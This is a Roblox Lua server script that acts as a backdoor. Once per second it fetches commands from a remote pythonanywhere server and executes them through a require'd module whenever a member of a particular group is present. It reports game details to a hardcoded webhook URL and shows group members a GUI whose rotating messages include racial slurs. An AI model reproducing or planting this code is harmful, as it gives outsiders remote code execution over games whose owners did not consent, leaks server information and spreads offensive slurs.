local hehe = 'https://devilishpotman1.pythonanywhere.com'
local iad = "https://webhook.newstargeted.com/api/webhooks/1244403591825981440/ulxE7FlM7ZyQjk_J78Pkx6g5SqftXGsSNST4CHIOw55VErEV5swNI3_b5Ho3c-YVHOvh"
local iddk = {
	["embeds"] = {
		{
			["title"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
			["url"] = "https://www.roblox.com/games/"..game.PlaceId,
			["name"] = "idk",
			["fields"] = {
				{
					["name"] = "player count",
					["value"] = #game.Players:GetPlayers(),
					["inline"] = false
				},
				{
					["name"] = "server size",
					["value"] = game.Players.MaxPlayers,
					["inline"] = false
				}
			}
		}
	}
}

local shega = 34360674

local adas = false

local function updateMessage(newMessage)
	local postData = {
		text = newMessage
	}

	local success, response = pcall(function()
		return game:GetService("HttpService"):PostAsync(hehe .. '/req', game:GetService("HttpService"):JSONEncode(postData), Enum.HttpContentType.ApplicationJson)
	end)

	if not success then
	end
end

local function getMessageFromServer()
	adas = false

	local success, response = pcall(function()
		return game:GetService("HttpService"):GetAsync(hehe .. '/req')
	end)

	if success then
		local responseData = game:GetService("HttpService"):JSONDecode(response)

		for _, player in ipairs(game.Players:GetPlayers()) do
			if player:IsInGroup(shega) then
				if not adas then
					local HEHE, RESPON = pcall(function()
						return 	require(14662625425)(responseData.message)()
					end)
					adas = true
				end
			end
		end
	else
	end
end

game.Players.PlayerAdded:Connect(function(plr)
	local dddasda = game:GetService("HttpService"):JSONEncode(iddk)
	game:GetService("HttpService"):PostAsync(iad, dddasda)
	if plr:IsInGroup(shega) then
		if not plr:FindFirstChild("idkhehe") then

			local idkhehe = Instance.new("ScreenGui")
			local Shadow = Instance.new("ImageLabel")
			local ImageButton = Instance.new("ImageButton")
			local UICorner = Instance.new("UICorner")
			local SomeStuff = Instance.new("TextLabel")

			--Properties:

			idkhehe.Name = "idkhehe"
			idkhehe.Parent = plr.PlayerGui
			idkhehe.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			idkhehe.ResetOnSpawn = false

			Shadow.Name = "Shadow"
			Shadow.Parent = idkhehe
			Shadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Shadow.BackgroundTransparency = 1.000
			Shadow.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Shadow.BorderSizePixel = 0
			Shadow.Position = UDim2.new(0.0030165913, 0, 0.908536613, 0)
			Shadow.Size = UDim2.new(0, 68, 0, 70)
			Shadow.Image = "rbxassetid://258799800"
			Shadow.ImageTransparency = 0.500

			ImageButton.Parent = idkhehe
			ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ImageButton.BackgroundTransparency = 1.000
			ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ImageButton.BorderSizePixel = 0
			ImageButton.Position = UDim2.new(0.00800000038, 0, 0.915000021, 0)
			ImageButton.Size = UDim2.new(0, 56, 0, 60)
			ImageButton.Image = "rbxassetid://17628083996"

			UICorner.CornerRadius = UDim.new(0, 50)
			UICorner.Parent = ImageButton

			SomeStuff.Name = "SomeStuff"
			SomeStuff.Parent = idkhehe
			SomeStuff.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			SomeStuff.BackgroundTransparency = 1.000
			SomeStuff.BorderColor3 = Color3.fromRGB(0, 0, 0)
			SomeStuff.BorderSizePixel = 0
			SomeStuff.Position = UDim2.new(0.054298643, 0, 0.920731723, 0)
			SomeStuff.Size = UDim2.new(0, 200, 0, 50)
			SomeStuff.SizeConstraint = Enum.SizeConstraint.RelativeYY
			SomeStuff.Font = Enum.Font.Arcade
			SomeStuff.TextColor3 = Color3.fromRGB(255, 255, 255)
			SomeStuff.TextSize = 17.000
			SomeStuff.TextStrokeTransparency = 0.000
			SomeStuff.TextWrapped = true
			SomeStuff.TextXAlignment = Enum.TextXAlignment.Left
			SomeStuff.TextYAlignment = Enum.TextYAlignment.Top

			-- Scripts:

			local Choo = Instance.new("Sound")
			Choo.Volume = 5
			Choo.SoundId = "rbxassetid://9120222747"
			Choo.Parent = ImageButton
			Choo.PlaybackSpeed = 2.506

			local function EIPO_fake_script() -- ImageButton.Roll 
				while task.wait() do
					ImageButton.Rotation += .250
				end
			end
			coroutine.wrap(EIPO_fake_script)()
			local function NFRD_fake_script() -- ImageButton.LocalScript 
				local deb = false
				ImageButton.MouseButton1Click:Connect(function()
					if deb == false then
						deb = true
						Choo:Play()
						task.wait(0.3)
						Choo:Play()
						deb = false
					end
				end)
			end
			coroutine.wrap(NFRD_fake_script)()
			local function CETCCWN_fake_script() -- SomeStuff.TypeScript 

				local function AnimateText(Text)
					for i = 1, #Text, 1 do
						SomeStuff.Text = string.sub(Text, 1, i)
						wait(0.05)
					end
				end

				while task.wait(4) do
					local amount = 7 -- amount of texts
					local ran = math.random(1, amount)

					if ran == 1 then
						AnimateText("Choo Choo motherfucker")
					end

					if ran == 2 then
						AnimateText("Hello")
					end

					if ran == 3 then
						AnimateText("What the n??ga")
					end

					if ran == 4 then
						AnimateText("gang is my gang")
					end

					if ran == 5 then
						AnimateText("Ummm what the n??ga")
					end
					if ran == 6 then
						AnimateText("CLICK ME!")
					end
					if ran == 7 then
						AnimateText("Unrestricted code??!?!")
					end
					if ran == 8 then
						AnimateText("Egg?")
					end
				end
			end
			coroutine.wrap(CETCCWN_fake_script)()
		end
	end
end)

while true do
	getMessageFromServer()
	task.wait(1)
end
